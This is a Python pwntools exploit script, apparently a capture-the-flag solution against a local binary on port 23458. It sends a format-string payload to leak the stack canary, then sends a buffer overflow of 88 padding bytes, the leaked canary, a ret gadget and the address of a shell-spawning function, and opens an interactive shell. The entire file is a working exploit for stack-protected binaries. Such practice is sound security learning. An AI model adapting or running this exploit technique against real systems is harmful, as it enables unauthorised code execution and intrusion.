from pwn import *

# io = gdb.debug("./test.elf","""
# b *0x00000000004011fd
# b shellter
# """)
#io = process("./main")
leakcanary = b"%17$p"
addr_shellter = 0x000000000401176
ret = 0x0000000000401195

#io.interactive()
io = remote("localhost",23458)


offsetcanary =  88
input()
print(io.recvline())
print(io.recvline())
print(io.recvline())
#print(io.recvline())

io.sendline(leakcanary)
#print(io.recvline())
canary = int(io.recvline(keepends=False).decode()[9:].strip("> "),16)

print(f"canary @ {(hex(canary))}")

io.recvline()

pl =  b"A" * (offsetcanary) + p64(canary) + p64(canary) + p64(ret) + p64(addr_shellter)


io.sendline(pl)
#print(io.recvline())
#io.recvline(timeout=2)
io.interactive()
#print(io.recvline())


